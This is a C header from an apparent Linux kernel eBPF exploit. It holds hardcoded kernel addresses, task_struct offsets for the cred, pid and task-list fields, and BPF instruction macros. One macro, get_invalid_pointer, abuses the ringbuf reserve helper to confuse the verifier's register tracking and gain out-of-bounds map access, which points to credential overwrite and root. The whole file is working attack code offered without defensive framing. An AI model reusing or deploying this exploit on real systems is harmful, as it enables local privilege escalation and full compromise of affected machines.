#ifndef _EXPLOIT_H
#define _EXPLOIT_H

#define DATA_SIZE 320
#define CACHE_SIZE 0x400
#define MAP_VALUE_OFFSET 0x110
#define OFFSET_TO_NEXT_MAP (CACHE_SIZE - MAP_VALUE_OFFSET)

#define MAP_BTF_OFFSET 0x40
#define BTF_ID_OFFSET 0x58

#define MAP_MUTEX_WAIT_LIST_OFFSET 0xc0
#define MAP_SPIN_LOCK_OFF_OFFSET 0x2c
#define MAP_MAX_ENTRIES_OFFSET 0x24
#define MAP_MAP_TYPE_OFFSET 0x18

#define NS_TASK_STRUCT_OFFSET 0x30

#define TASK_STRUCT_PID_OFFSET 0x920
#define TASK_STRUCT_CRED_OFFSET 0xae8
#define TASK_STRUCT_NEXT_OFFSET 0x818

#define INIT_PID_NS 0xffffffff82e6d040
#define ARRAY_MAP_GET_NEXT_KEY 0xffffffff81219fb0

typedef struct exploit_context
{
    int ringbuf_map_fd;
    int a_fd;
    int b_fd;
    int prog_fd;
    unsigned long kernel_slide
} exploit_context;


#define get_invalid_pointer(oob_map_fd, dest_reg, value) \
/* get invalid register with value 0 in REG_0 */ \
BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd), \
BPF_MOV64_IMM(BPF_REG_2, (unsigned int)0), \
BPF_MOV64_IMM(BPF_REG_3, (unsigned int)0xffffffffffffffff), \
BPF_EMIT_CALL(BPF_RINGBUF_RESERVE), \
/* copy returned value (0) to desired register and set it to value-1 */ \
BPF_MOV64_REG(dest_reg, BPF_REG_0), \
BPF_ALU64_IMM(BPF_ADD, dest_reg, value-1), \
/* check if the returned map value pointer is valid */ \
BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5), \
/* the next 5 instructions will never execute */ \
BPF_MOV64_REG(BPF_REG_1, BPF_REG_0), \
BPF_MOV64_IMM(BPF_REG_2, (unsigned int)0),  \
BPF_EMIT_CALL(BPF_RINGBUF_DISCARD), \
BPF_MOV64_IMM(BPF_REG_0, 0), \
BPF_EXIT_INSN(), \
/* this is where we arrive after the jump */ \
BPF_ALU64_IMM(BPF_ADD, dest_reg, 1)

#define get_map_value_pointer(map_fd, key, dest_reg) \
BPF_LD_MAP_FD(BPF_REG_1, map_fd), \
BPF_MOV64_IMM(BPF_REG_0, key), \
BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), \
BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), \
BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2), \
BPF_MOV64_IMM(BPF_REG_0, 0), \
BPF_EXIT_INSN(), \
BPF_MOV64_REG(dest_reg, BPF_REG_0)

#endif
